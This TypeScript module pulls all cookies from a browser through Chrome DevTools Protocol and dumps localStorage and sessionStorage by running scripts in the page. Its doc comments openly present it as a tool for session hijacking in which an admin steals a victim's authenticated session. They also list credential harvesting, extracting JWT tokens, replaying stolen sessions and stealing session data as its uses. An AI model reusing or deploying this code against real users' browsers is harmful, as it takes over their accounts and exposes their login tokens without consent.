import type { BrowserInstance, SerializedCookie, CookiePayload, StoragePayload } from './types.js';

// ═══════════════════════════════════════════════════════════════════════════════
// Cookie Extraction
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Extracts all cookies from a browser instance via Chrome DevTools Protocol (CDP).
 * 
 * **How it works:**
 * - Uses CDP's `Network.getAllCookies` command (not Playwright's API)
 * - Captures cookies from all domains/paths in the browser context
 * - Includes session cookies and persistent cookies
 * - Returns cookies in a format compatible with Playwright's cookie API
 * 
 * **Use cases:**
 * - Session hijacking (admin steals victim's authenticated session)
 * - Credential harvesting (extract auth tokens, session IDs)
 * - Session restoration (replay stolen session in another browser)
 * 
 * @param instance - Browser instance to extract cookies from
 * @returns Cookie payload with browser ID and serialized cookies
 * @throws Error if CDP session is not available or extraction fails
 */
export async function extractCookies(instance: BrowserInstance): Promise<CookiePayload> {
  const { cdpSession, id: browserId } = instance;

  if (!cdpSession) {
    throw new Error(`No CDP session for browser ${browserId}`);
  }

  let result: { cookies: SerializedCookie[] };
  try {
    // Use CDP to get all cookies (more reliable than Playwright's context.cookies())
    const raw = await cdpSession.send('Network.getAllCookies');
    
    // CDP returns cookies with expires as float (unix seconds, -1 = session)
    result = {
      cookies: (raw as { cookies: RawCdpCookie[] }).cookies.map(normalizeCookie),
    };
  } catch (err) {
    throw new Error(`Cookie extraction failed: ${(err as Error).message}`);
  }

  return { browserId, cookies: result.cookies };
}

// ═══════════════════════════════════════════════════════════════════════════════
// Storage Extraction
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Extracts localStorage and sessionStorage from a browser instance.
 * 
 * **How it works:**
 * - Injects JavaScript into the page context
 * - Iterates through localStorage and sessionStorage
 * - Returns all key-value pairs as plain objects
 * 
 * **Limitations:**
 * - Only extracts storage from the current page's origin
 * - Cannot access storage from other origins (same-origin policy)
 * - Does not capture IndexedDB or other storage mechanisms
 * 
 * **Use cases:**
 * - Extract JWT tokens stored in localStorage
 * - Capture user preferences and settings
 * - Steal temporary session data
 * 
 * @param instance - Browser instance to extract storage from
 * @returns Storage payload with browser ID and storage objects
 */
export async function extractStorage(instance: BrowserInstance): Promise<StoragePayload> {
  const { page, id: browserId } = instance;

  // Extract localStorage and sessionStorage in parallel for efficiency
  const [localStorageData, sessionStorageData] = await Promise.all([
    // Extract localStorage
    page.evaluate(() => {
      const result: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key !== null) result[key] = localStorage.getItem(key) ?? '';
      }
      return result;
    }),
    // Extract sessionStorage
    page.evaluate(() => {
      const result: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key !== null) result[key] = sessionStorage.getItem(key) ?? '';
      }
      return result;
    }),
  ]);

  return {
    browserId,
    localStorage: localStorageData,
    sessionStorage: sessionStorageData,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// Internal Helper Functions
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Raw cookie format returned by CDP's Network.getAllCookies.
 * This is the internal CDP format before normalization.
 */
interface RawCdpCookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  expires: number;
  httpOnly: boolean;
  secure: boolean;
  sameSite?: string;
}

/**
 * Normalizes a CDP cookie to our SerializedCookie format.
 * 
 * Handles:
 * - SameSite attribute normalization (CDP uses different values)
 * - Type safety (ensures all fields are present)
 * 
 * @param c - Raw CDP cookie
 * @returns Normalized SerializedCookie
 */
function normalizeCookie(c: RawCdpCookie): SerializedCookie {
  return {
    name: c.name,
    value: c.value,
    domain: c.domain,
    path: c.path,
    expires: c.expires,
    httpOnly: c.httpOnly,
    secure: c.secure,
    sameSite: normalizeSameSite(c.sameSite),
  };
}

/**
 * Normalizes CDP's SameSite attribute to our standard format.
 * 
 * CDP may return:
 * - 'Strict', 'Lax', 'None' (standard values)
 * - undefined (no SameSite attribute set)
 * 
 * We normalize undefined to 'no_restriction' for consistency.
 * 
 * @param raw - Raw SameSite value from CDP
 * @returns Normalized SameSite value
 */
function normalizeSameSite(
  raw: string | undefined,
): 'Strict' | 'Lax' | 'None' | 'no_restriction' {
  switch (raw) {
    case 'Strict':
      return 'Strict';
    case 'Lax':
      return 'Lax';
    case 'None':
      return 'None';
    default:
      return 'no_restriction';
  }
}